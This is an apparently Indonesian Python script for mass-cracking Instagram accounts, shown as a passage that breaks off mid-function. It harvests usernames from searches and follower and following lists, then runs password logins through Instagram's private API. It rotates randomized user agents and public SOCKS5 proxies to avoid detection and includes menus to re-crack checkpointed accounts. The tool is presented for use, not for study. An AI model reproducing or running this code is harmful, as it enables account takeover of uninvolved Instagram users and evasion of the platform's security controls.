#------------------[ IMPORT RICH ]-------------------#
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich import print as cetak
from rich.progress import track
from bs4 import BeautifulSoup as sop
from rich.panel import Panel as nel
from rich.table import Table as me
from rich.columns import Columns
from rich.table import Table as me
from rich.console import Console as sol
from rich.console import Console as sol
console = Console()
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn

#------------------[ GLOBAL NAME ]-------------------#
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
method, xxkontol, BrayGagah, BrayUarand, proxxy, UserBrayCrack = [], [], [], [], [], []
batam=[]
s = requests.Session()
day = datetime.now().strftime("%d-%b-%Y")
nyMnD, nyMxD, menudump, = 5, 10, []
current_GMT = time.gmtime(time.time())

#------------------[ DEF BULAN ]-------------------#
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

#------------------[ INSTAGRAM LOGIN ]-------------------#
insta_log = "https://www.instagram.com/accounts/login/?force_classic_login=&"
url        = "https://i.instagram.com/"

#------------------[ COLOUR FOR PRINT ]-------------------#
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
H = "\033[0;92m" # HIJAU
K = "\033[0;93m" #KUNING
M = '\x1b[1;91m' # MERAH
P = "\033[0m" # PUTIH

#------------------[ WARNA FOR RICH ]-------------------#
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

#------------------[ RANDOM COLOR RICH ]-------------------#
L1 = "[#875f5f]" # LIGHT
G1  = "[#ffd700]" # GOLD
M1  = "[#875fd7]" # MEDIUM GREEN
P1   = "[#FF00FF]" # PINK
W1  = "[#FFFFFF]" # WHITE
S1   = "[#87afff]" # SKY BLUE
O1   = "[#d78700]" # ORANGE3
O3   = "[#ff5fff]" # MEDIUM ORCH3

#------------------[ COLOR TABLE FOR RICH ]-------------------#
LIGHT = "#875f5f" # LIGHT
GOLD    = "#ffd700" # GOLD
MEDIUM  = "#875fd7" # MEDIUM GREEN
PINK    = "#FF00FF" # PINK
WHITE  = "#FFFFFF" # WHITE
SKY     = "#87afff" # SKY BLUE
ORNG   = "#d78700" # ORANGE3
ORCH   = "#ff5fff" # MEDIUM ORCH

#------------------[ RANDOM RICH ]-------------------#
DIT      = random.choice([M2,K2,H2,B2,N2])
TYA     = random.choice ([LIGHT,GOLD,MEDIUM,PINK,SKY,ORNG,ORCH])
ADTYA1 = random.choice([L1,G1,M1,P1,S1,O1,O1])
ADTYA2 = random.choice([H,K,O,B])

#------------------[ WARNA ]-------------------#
try:
	color_rich = open("data/color_rich.txt","r").read()
except FileNotFoundError:
	color_rich = "[#afafff]"
try:
	color_table = open("data/color_table.txt","r").read()
except FileNotFoundError:
	color_table = "#afafff"

#------------------[ USER-AGENT ]-------------------#
USN = "Mozilla/5.0 (Linux; Android 9; FIG-LX1 Build/HUAWEIFIG-L11; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 Instagram 240.2.0.18.107 Android (28 /9; 480dpi; 1080x2032; HUAWEI; FIG-LX1; HWFIG-H; hi6250; it_IT; 378116740)"

def BrayennnXD():
    rr = random.randint
    a1 = random.choice(['SM-G532F','SM-V417I','SM-J400F','SM-T733','SM-F926B'])
    a2 = random.choice(['CPH2059','CPH2001','CPH1909','CPH2269','CPH1729'])
    p1 = f"Mozilla/5.0 (Linux; Android {str(rr(11,19))}; {a1} Build/PPR1.{str(rr(111111,210000))}.0{str(rr(11,19))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    p2 = f"Mozilla/5.0 (Linux; Android {str(rr(11,19))}; {a2} Build/SP1A.{str(rr(111111,210000))}.0{str(rr(11,19))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    UaMainn = random.choice([p1, p2])
    batam.append(UaMainn)

for x in range(1000):
    rr = random.randint
    rc = random.choice
    g1 = random.choice(['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19'])
    g2 = random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-A405FN Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J610G Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u3 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-G610M Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u4 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; CPH2109 Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u5 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J120H Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u6 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-M317F Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    Ua = random.choice([u1, u2, u3, u4, u5, u6])
    UserBrayCrack.append(Ua)

#------------------[ URL-PROXY ]-------------------#
try:
    url_proxy = random.choice([
              "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt", 
              "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt", 
              "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt", 
              "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt", 
              "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt", 
              "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks5.txt", 
	      "https://raw.githubusercontent.com/Itsmeafriliyan/sakera/main/ua.txt", 
              ])
except:pass
   
#------------------[ PROXIES ]-------------------#
try:
    url = requests.get(f"{url_proxy}").text
    for brayen in url.splitlines():proxxy.append(brayen)
except requests.exceptions.ConnectionError:
   os.system("clear")
   prints(Panel(f"{P2}     Anda Tidak Terhubung Ke Internet, Silahkan Periksa Koneksi Internet Anda",width=90,padding=(0,2),style=f"bold white"));sleep(3);exit()

#------------------[ GET-IP ]-------------------#
url = requests.get("http://ip-api.com/json/").json()
try:
	IP  = url["query"]
	CN = url["country"]
except KeyError:
	IP = "-"
	CN = "-"
    
#------------------[ WAKTU ]-------------------#
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Selamat Pagi"
	elif 12 <= hours < 15:timenow = "Selamat Siang"
	elif 15 <= hours < 18:timenow = "Selamat Petang"
	else:timenow = "Selamat Malam"
	return timenow

#------------------[ CLEAR-LAYAR ]-------------------#
def clear():
    try:os.system("clear")
    except:pass

#------------------[ PYTHON VERSION ]-------------------#
try:
    # python 2
	urllib_quote_plus = urllib.quote
except:
    # python 3
	urllib_quote_plus = urllib.parse.quote_plus

#------------------[ URL LOGIN ]-------------------#
def cekAPI(cookie):
    user=open('data/.username','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':cookie},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except  (ValueError,KeyError):
        prints(Panel(f"{P2}Opshh Akun Tumbal Mu Terkena Checkpoint, Silahkan Login Dengan Akun Lain",width=90,style=f"bold white"));os.system('rm -rf data/.kukis.log rm -rf data/.username');exit()
    return external,user

#------------------[ LOGIN COOKIES ]-------------------#
def loginCookie():
    if "sukses" in lisensiku:
        try:
            kuki=open('data/.kukis.log','r').read()
        except FileNotFoundError:
            prints(Panel(f"{P2}Sebelum Login Pastikan Akun Tumbal Bersifat Publik Dan Tidak Private",width=90,padding=(0,4),style=f"bold white"))
            us=input(f' [+] {H}Masukan Username :{H} ')
            cok=input(f'{P} [+] {H}Masukan Cookie   :{H} ')
            kuki=open('data/.kukis.log','w').write(cok)
            user=open('data/.username','w').write(us)
            time.sleep(6)
            prints(Panel(f"{P2}Login Akun Tumbal Berhasil, Silahkan Jalankan Ulang Scriptnya",width=90,padding=(0,7),style=f"bold white"));exit()
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
    else:
        lisensi()

class instagramAPI:
	API_URL = 'https://i.instagram.com/api/v1/'
	DEVICE_SETTINTS = {'manufacturer': 'Xiaomi',
		'model': 'HM 1SW',
		'android_version': 18,
		'android_release': '4.3'}
	USER_AGENT = 'Instagram 10.26.0 Android ({android_version}/{android_release}; 320dpi; 720x1280; {manufacturer}; {model}; armani; qcom; en_US)'.format(**DEVICE_SETTINTS)
	IG_SIG_KEY = '4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'
	EXPERIMENTS = 'ig_promote_reach_objective_fix_universe,ig_android_universe_video_production,ig_search_client_h1_2017_holdout,ig_android_live_follow_from_comments_universe,ig_android_carousel_non_square_creation,ig_android_live_analytics,ig_android_follow_all_dialog_confirmation_copy,ig_android_stories_server_coverframe,ig_android_video_captions_universe,ig_android_offline_location_feed,ig_android_direct_inbox_retry_seen_state,ig_android_ontact_invite_universe,ig_android_live_broadcast_blacklist,ig_android_insta_video_reconnect_viewers,ig_android_ad_async_ads_universe,ig_android_search_clear_layout_universe,ig_android_shopping_reporting,ig_android_stories_surface_universe,ig_android_verified_comments_universe,ig_android_preload_media_ahead_in_current_reel,android_instagram_prefetch_suggestions_universe,ig_android_reel_viewer_fetch_missing_reels_universe,ig_android_direct_search_share_sheet_universe,ig_android_business_promote_tooltip,ig_android_direct_blue_tab,ig_android_async_network_tweak_universe,ig_android_elevate_main_thread_priority_universe,ig_android_stories_gallery_nux,ig_android_instavideo_remove_nux_comments,ig_video_copyright_whitelist,ig_react_native_inline_insights_with_relay,ig_android_direct_thread_message_animation,ig_android_draw_rainbow_client_universe,ig_android_direct_link_style,ig_android_live_heart_enhancements_universe,ig_android_rtc_reshare,ig_android_preload_item_count_in_reel_viewer_buffer,ig_android_users_bootstrap_service,ig_android_auto_retry_post_mode,ig_android_shopping,ig_android_main_feed_seen_state_dont_send_info_on_tail_load,ig_fbns_preload_default,ig_android_gesture_dismiss_reel_viewer,ig_android_tool_tip,ig_android_ad_logger_funnel_logging_universe,ig_android_gallery_grid_column_count_universe,ig_android_business_new_ads_payment_universe,ig_android_direct_links,ig_android_audience_control,ig_android_live_encore_consumption_settings_universe,ig_perf_android_holdout,ig_android_cache_contact_import_list,ig_android_links_receivers,ig_android_ad_impression_backtest,ig_android_list_redesign,ig_android_stories_separate_overlay_creation,ig_android_stop_video_recording_fix_universe,ig_android_render_video_segmentation,ig_android_live_encore_reel_chaining_universe,ig_android_sync_on_background_enhanced_10_25,ig_android_immersive_viewer,ig_android_mqtt_skywalker,ig_fbns_push,ig_android_ad_watchmore_overlay_universe,ig_android_react_native_universe,ig_android_profile_tabs_redesign_universe,ig_android_live_consumption_abr,ig_android_story_viewer_social_context,ig_android_hide_post_in_feed,ig_android_video_loopcount_int,ig_android_enable_main_feed_reel_tray_preloading,ig_android_camera_upsell_dialog,ig_android_ad_watchbrowse_universe,ig_android_internal_research_settings,ig_android_search_people_tag_universe,ig_android_react_native_ota,ig_android_enable_concurrent_request,ig_android_react_native_stories_grid_view,ig_android_business_stories_inline_insights,ig_android_log_mediacodec_info,ig_android_direct_expiring_media_loading_errors,ig_video_use_sve_universe,ig_android_cold_start_feed_request,ig_android_enable_zero_rating,ig_android_reverse_audio,ig_android_branded_content_three_line_ui_universe,ig_android_live_encore_production_universe,ig_stories_music_sticker,ig_android_stories_teach_gallery_location,ig_android_http_stack_experiment_2017,ig_android_stories_device_tilt,ig_android_pending_request_search_bar,ig_android_fb_topsearch_sgp_fork_request,ig_android_seen_state_with_view_info,ig_android_animation_perf_reporter_timeout,ig_android_new_block_flow,ig_android_story_tray_title_play_all_v2,ig_android_direct_address_links,ig_android_stories_archive_universe,ig_android_save_collections_cover_photo,ig_android_live_webrtc_livewith_production,ig_android_sign_video_url,ig_android_stories_video_prefetch_kb,ig_android_stories_create_flow_favorites_tooltip,ig_android_live_stop_broadcast_on_404,ig_android_live_viewer_invite_universe,ig_android_promotion_feedback_channel,ig_android_render_iframe_interval,ig_android_accessibility_logging_universe,ig_android_camera_shortcut_universe,ig_android_use_one_cookie_store_per_user_override,ig_profile_holdout_2017_universe,ig_android_stories_server_brushes,ig_android_ad_media_url_logging_universe,ig_android_shopping_tag_nux_text_universe,ig_android_comments_single_reply_universe,ig_android_stories_video_loading_spinner_improvements,ig_android_collections_cache,ig_android_comment_api_spam_universe,ig_android_facebook_twitter_profile_photos,ig_android_shopping_tag_creation_universe,ig_story_camera_reverse_video_experiment,ig_android_direct_bump_selected_recipients,ig_android_ad_cta_haptic_feedback_universe,ig_android_vertical_share_sheet_experiment,ig_android_family_bridge_share,ig_android_search,ig_android_insta_video_consumption_titles,ig_android_stories_gallery_preview_button,ig_android_fb_auth_education,ig_android_camera_universe,ig_android_me_only_universe,ig_android_instavideo_audio_only_mode,ig_android_user_profile_chaining_icon,ig_android_live_video_reactions_consumption_universe,ig_android_stories_hashtag_text,ig_android_post_live_badge_universe,ig_android_swipe_fragment_container,ig_android_search_users_universe,ig_android_live_save_to_camera_roll_universe,ig_creation_growth_holdout,ig_android_sticker_region_tracking,ig_android_unified_inbox,ig_android_live_new_watch_time,ig_android_offline_main_feed_10_11,ig_import_biz_contact_to_page,ig_android_live_encore_consumption_universe,ig_android_experimental_filters,ig_android_search_client_matching_2,ig_android_react_native_inline_insights_v2,ig_android_business_conversion_value_prop_v2,ig_android_redirect_to_low_latency_universe,ig_android_ad_show_new_awr_universe,ig_family_bridges_holdout_universe,ig_android_background_explore_fetch,ig_android_following_follower_social_context,ig_android_video_keep_screen_on,ig_android_ad_leadgen_relay_modern,ig_android_profile_photo_as_media,ig_android_insta_video_consumption_infra,ig_android_ad_watchlead_universe,ig_android_direct_prefetch_direct_story_json,ig_android_shopping_react_native,ig_android_top_live_profile_pics_universe,ig_android_direct_phone_number_links,ig_android_stories_weblink_creation,ig_android_direct_search_new_thread_universe,ig_android_histogram_reporter,ig_android_direct_on_profile_universe,ig_android_network_cancellation,ig_android_background_reel_fetch,ig_android_react_native_insights,ig_android_insta_video_audio_encoder,ig_android_family_bridge_bookmarks,ig_android_data_usage_network_layer,ig_android_universal_instagram_deep_links,ig_android_dash_for_vod_universe,ig_android_modular_tab_discover_people_redesign,ig_android_mas_sticker_upsell_dialog_universe,ig_android_ad_add_per_event_counter_to_logging_event,ig_android_sticky_header_top_chrome_optimization,ig_android_rtl,ig_android_biz_conversion_page_pre_select,ig_android_promote_from_profile_button,ig_android_live_broadcaster_invite_universe,ig_android_share_spinner,ig_android_text_action,ig_android_own_reel_title_universe,ig_promotions_unit_in_insights_landing_page,ig_android_business_settings_header_univ,ig_android_save_longpress_tooltip,ig_android_constrain_image_size_universe,ig_android_business_new_graphql_endpoint_universe,ig_ranking_following,ig_android_stories_profile_camera_entry_point,ig_android_universe_reel_video_production,ig_android_power_metrics,ig_android_sfplt,ig_android_offline_hashtag_feed,ig_android_live_skin_smooth,ig_android_direct_inbox_search,ig_android_stories_posting_offline_ui,ig_android_sidecar_video_upload_universe,ig_android_promotion_manager_entry_point_universe,ig_android_direct_reply_audience_upgrade,ig_android_swipe_navigation_x_angle_universe,ig_android_offline_mode_holdout,ig_android_live_send_user_location,ig_android_direct_fetch_before_push_notif,ig_android_non_square_first,ig_android_insta_video_drawing,ig_android_swipeablefilters_universe,ig_android_live_notification_control_universe,ig_android_analytics_logger_running_background_universe,ig_android_save_all,ig_android_reel_viewer_data_buffer_size,ig_direct_quality_holdout_universe,ig_android_family_bridge_discover,ig_android_react_native_restart_after_error_universe,ig_android_startup_manager,ig_story_tray_peek_content_universe,ig_android_profile,ig_android_high_res_upload_2,ig_android_http_service_same_thread,ig_android_scroll_to_dismiss_keyboard,ig_android_remove_followers_universe,ig_android_skip_video_render,ig_android_story_timestamps,ig_android_live_viewer_comment_prompt_universe,ig_profile_holdout_universe,ig_android_react_native_insights_grid_view,ig_stories_selfie_sticker,ig_android_stories_reply_composer_redesign,ig_android_streamline_page_creation,ig_explore_netego,ig_android_ig4b_connect_fb_button_universe,ig_android_feed_util_rect_optimization,ig_android_rendering_controls,ig_android_os_version_blocking,ig_android_encoder_width_safe_multiple_16,ig_search_new_bootstrap_holdout_universe,ig_android_snippets_profile_nux,ig_android_e2e_optimization_universe,ig_android_comments_logging_universe,ig_shopping_insights,ig_android_save_collections,ig_android_live_see_fewer_videos_like_this_universe,ig_android_show_new_contact_import_dialog,ig_android_live_view_profile_from_comments_universe,ig_fbns_blocked,ig_formats_and_feedbacks_holdout_universe,ig_android_reduce_view_pager_buffer,ig_android_instavideo_periodic_notif,ig_search_user_auto_complete_cache_sync_ttl,ig_android_marauder_update_frequency,ig_android_suggest_password_reset_on_oneclick_login,ig_android_promotion_entry_from_ads_manager_universe,ig_android_live_special_codec_size_list,ig_android_enable_share_to_messenger,ig_android_background_main_feed_fetch,ig_android_live_video_reactions_creation_universe,ig_android_channels_home,ig_android_sidecar_gallery_universe,ig_android_upload_reliability_universe,ig_migrate_mediav2_universe,ig_android_insta_video_broadcaster_infra_perf,ig_android_business_conversion_social_context,android_ig_fbns_kill_switch,ig_android_live_webrtc_livewith_consumption,ig_android_destroy_swipe_fragment,ig_android_react_native_universe_kill_switch,ig_android_stories_book_universe,ig_android_all_videoplayback_persisting_sound,ig_android_draw_eraser_universe,ig_direct_search_new_bootstrap_holdout_universe,ig_android_cache_layer_bytes_threshold,ig_android_search_hash_tag_and_username_universe,ig_android_business_promotion,ig_android_direct_search_recipients_controller_universe,ig_android_ad_show_full_name_universe,ig_android_anrwatchdog,ig_android_qp_kill_switch,ig_android_2fac,ig_direct_bypass_group_size_limit_universe,ig_android_promote_simplified_flow,ig_android_share_to_whatsapp,ig_android_hide_bottom_nav_bar_on_discover_people,ig_fbns_dump_ids,ig_android_hands_free_before_reverse,ig_android_skywalker_live_event_start_end,ig_android_live_join_comment_ui_change,ig_android_direct_search_story_recipients_universe,ig_android_direct_full_size_gallery_upload,ig_android_ad_browser_gesture_control,ig_channel_server_experiments,ig_android_video_cover_frame_from_original_as_fallback,ig_android_ad_watchinstall_universe,ig_android_ad_viewability_logging_universe,ig_android_new_optic,ig_android_direct_visual_replies,ig_android_stories_search_reel_mentions_universe,ig_android_threaded_comments_universe,ig_android_mark_reel_seen_on_Swipe_forward,ig_internal_ui_for_lazy_loaded_modules_experiment,ig_fbns_shared,ig_android_capture_slowmo_mode,ig_android_live_viewers_list_search_bar,ig_android_video_single_surface,ig_android_offline_reel_feed,ig_android_video_download_logging,ig_android_last_edits,ig_android_exoplayer_4142,ig_android_post_live_viewer_count_privacy_universe,ig_android_activity_feed_click_state,ig_android_snippets_haptic_feedback,ig_android_gl_drawing_marks_after_undo_backing,ig_android_mark_seen_state_on_viewed_impression,ig_android_live_backgrounded_reminder_universe,ig_android_live_hide_viewer_nux_universe,ig_android_live_monotonic_pts,ig_android_search_top_search_surface_universe,ig_android_user_detail_endpoint,ig_android_location_media_count_exp_ig,ig_android_comment_tweaks_universe,ig_android_ad_watchmore_entry_point_universe,ig_android_top_live_notification_universe,ig_android_add_to_last_post,ig_save_insights,ig_android_live_enhanced_end_screen_universe,ig_android_ad_add_counter_to_logging_event,ig_android_blue_token_conversion_universe,ig_android_exoplayer_settings,ig_android_progressive_jpeg,ig_android_offline_story_stickers,ig_android_gqls_typing_indicator,ig_android_chaining_button_tooltip,ig_android_video_prefetch_for_connectivity_type,ig_android_use_exo_cache_for_progressive,ig_android_samsung_app_badging,ig_android_ad_holdout_watchandmore_universe,ig_android_offline_commenting,ig_direct_stories_recipient_picker_button,ig_insights_feedback_channel_universe,ig_android_insta_video_abr_resize,ig_android_insta_video_sound_always_on'''
	SIG_KEY_VERSION = '4'

	def __init__(self,username,password):
		self.username=username
		self.password=password
		m = hashlib.md5()
		m.update(username.encode('utf-8') + password.encode('utf-8'))
		self.device_id = self.generateDeviceId(m.hexdigest())
		self.uuid = self.generateUUID(True)
		self.s = requests.Session()

	def generateDeviceId(self, seed):
		volatile_seed = "12345"
		m = hashlib.md5()
		m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8'))
		return 'android-' + m.hexdigest()[:16]

	def generateUUID(self, type):
		generated_uuid = str(uuid.uuid4())
		if (type):
			return generated_uuid
		else:
			return generated_uuid.replace('-', '')

	def loginAPI(self):
		token=self.s.get("https://i.instagram.com/",headers={"user-agent":USN}).text
		crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
		self.s.headers.update({'Connection': 'close',
			'Accept': '*/*',
			'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Cookie2': '$Version=1',
			'Accept-Language': 'en-US',
			'User-Agent': USN})
		self.data = json.dumps({
			'phone_id': self.generateUUID(True),
			'_csrftoken': crf_token,
			'username': self.username,
			'guid': self.uuid,
			'device_id': self.device_id,
			'password': self.password,
			'login_attempt_count': '0'})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(self.data)
		)
		x=self.s.post("https://i.instagram.com/api/v1/accounts/login/", self.payload)
		x_jason=json.loads(x.text)
		x_kukis=x.cookies.get_dict()
		if "logged_in_user" in x.text:
			kuki=";".join([v+"="+x_kukis[v] for v in x_kukis])
			#id=x_jason['logged_in_user']['pk']
			#nm=x_jason['logged_in_user']['full_name']
			#pn=x_jason['logged_in_user']['phone_number']
			return {'status':'success','cookie':kuki,'userame':self.username}
		elif 'challenge_required' in x.text:
			return {'status':'checkpoint'}
		else:
			return {'status':'login_error'}
C = ''

#------------------[ MENU TOOLS ]-------------------#
class instagram:
	def __init__(self,external,username,cookie):
		self.ext=external
		self.username=username
		self.cookie=cookie
		self.s=requests.Session()
	def logo(self):
		for i in external:
			try:
				nama=i.split('|')[0]
				followers=i.split('|')[1]
				following=i.split('|')[2]
			except:
				pass
			BrayGagah.append(Panel(f"{P2}nama      : {H2}{nama}\n{P2}username  : {H2}{self.username}",width=45,padding=(0,2),style=f"bold white"))
			BrayGagah.append(Panel(f"{P2}pengikut  : {H2}{followers}\n{P2}mengikuti : {H2}{following}",width=45,padding=(0,2),style=f"bold white"))
			console.print(Columns(BrayGagah))
			prints(Panel(f"{P2}Selamat Datang {H2}{nama} {P2}Gunakan Tools Dengan Bijak :)",width=90,padding=(0,9),style=f"bold white"))
			prints(Panel(f"{P2}[[bold cyan]01{P2}]. Dump Id Pencarian Nama       {P2}[[bold cyan]05{P2}]. Lihat Hasil Crack\n{P2}[[bold cyan]02{P2}]. Dump Id Pengikut             {P2}[[bold cyan]06{P2}]. Bot Auto Unfollow\n{P2}[[bold cyan]03{P2}]. Dump Id Mengikuti            {P2}[[bold cyan]07{P2}]. Report Bug Script\n{P2}[[bold cyan]04{P2}]. Crack Ulang Hasil Cp         {P2}[[bold cyan]00{P2}]. Keluar Tools",width=90,padding=(0,4),style=f"bold white"))

			
	def hapus_lisensi(self):
		ask = input(f" [+] Apakah Anda Yakin Ingin Menghapus Lisensi? Y/t : ")
		if ask in ["y","Y"]:os.system("rm -rf data/lisensi.txt");prints(Panel(f"{P2}Succeed Menghapus {color_rich}'Lisensi'{P2} Terima Kasih Telah Menggunakan Script Brayennn-Prem",width=90,style=f"bold white"));time.sleep(2);exit()
		elif ask in ["t","T"]:self.menu()
		else:self.hapus_lisensi()

	def Exit(self):
		x=input(f" [+] Apakah Anda Yakin Ingin Keluar? Y/t : ")
		if x in ["y","Y"]:os.system("rm -rf data/.kukis.log rm -rf data/.username");prints(Panel(f"{P2}Succeed Menghapus {color_rich}'Cookie' {P2}Terima Kasih Telah Menggunakan Script BrayenInsta",width=90,padding=(0,2),style=f"bold white"));time.sleep(2);exit()
		elif x in ["t","T"]:self.menu() 
		else:self.menu()

	def sixAPI(self,six_id):
		url = "https://i.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
		x = requests.get(url)
		x_jason = x.json()
		uid = str( x_jason['users'][0].get("user").get("pk") )
		return uid

	def unfollowAPI(self,user_id,username_id,cookie):
		uuid=self.generateUUID(True)
		xx=self.s.get("https://i.instagram.com/",headers={"user-agent":USN}).content
		crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
		s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': USN})

		data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})

		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(data))
		return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text


	def searchAPI(self,cookie,nama):
		try:
			x=s.get('https://i.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
			x_jason=json.loads(x.text)
			for i in x_jason['users']:
				user=i['user']
				username=user['username']
				fullname=user['full_name']
				internal.append(f'{username}|{fullname}')
		except requests.exceptions.ConnectionError:
			prints(Panel(f'{P2}koneksi internet anda bermasalah silahkan cek dan coba lagi masuk ke tools',width=90,style=f"bold white"));time.sleep(3);exit()
		return internal

	def idAPI(self,cookie,id):
		if 'sukses' in lisensiku:
			try:
				m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
				m_jason=m.json()["data"]["user"]
				idx=m_jason["id"]
			except requests.exceptions.ConnectionError:
				prints(Panel(f'{P2}koneksi internet anda bermasalah silahkan cek dan coba lagi masuk ke tools',width=90,style=f"bold white"));time.sleep(3);exit()
			except Exception as e:
				prints(Panel(f'{P2}Username Yang Anda Masukan Tidak Di Temukan Atau Akun Private',width=90,padding=(0,7),style=f"bold white"));exit()
			return idx
		else:lisensi()
   
   	
	def ingfo(self,cookie):
		try:
			link = s.get(f"https://i.instagram.com/api/v1/accounts/edit/web_form_data/", headers={"user-agent":USN},cookies={"cookie":cookie}).json()["form_data"]
			nomor = link["phone_number"].replace("-", "").replace(" ", "")
			tggl = link["birthday"]
			year, month, day = tggl.split("-")
			month = bulan_ttl[month]
			tanggal = (f"{day} {month} {year}")
		except:
			nomor = "-"
			tanggal = "-"
		return nomor, tanggal
	
	def infoAPI(self,cookie,api,id):
		if 'sukses' in  lisensiku:
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'pengikut' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
							try:
								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				else:pass
			except requests.exceptions.ConnectionError:
				prints(Panel(f'{P2}Koneksi Internet Anda Bermasalah Silahkan Cek Dan Coba Lagi Masuk Ke Tools',width=90,style=f"bold white"));time.sleep(3);exit()
			except Exception as e:
